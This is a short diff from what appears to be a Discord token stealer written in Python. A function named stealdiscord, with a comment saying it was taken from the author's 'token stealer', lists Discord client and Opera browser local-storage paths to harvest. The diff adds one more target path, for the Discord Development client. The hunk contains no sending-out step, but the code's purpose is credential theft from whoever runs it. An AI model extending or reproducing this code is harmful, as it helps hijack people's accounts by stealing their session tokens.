@@ -755,6 +755,7 @@ def stealdiscord(): #stole this from my token stealer
     '1Discord': os.path.join(roaming, 'discord'),
     '1DiscordPTB': os.path.join(roaming, 'discordptb'),
     '1DiscordCanary': os.path.join(roaming, 'discordcanary'),
+    '1DiscordDevelopment': os.path.join(roaming, 'discorddevelopment'),
     '1Lightcord': os.path.join(roaming, 'Lighcord'),
     '2OperaOld': os.path.join(roaming, 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
     '2Operanew': os.path.join(roaming, 'Opera Software', 'Opera Stable', 'Default', 'Local Storage', 'leveldb'),
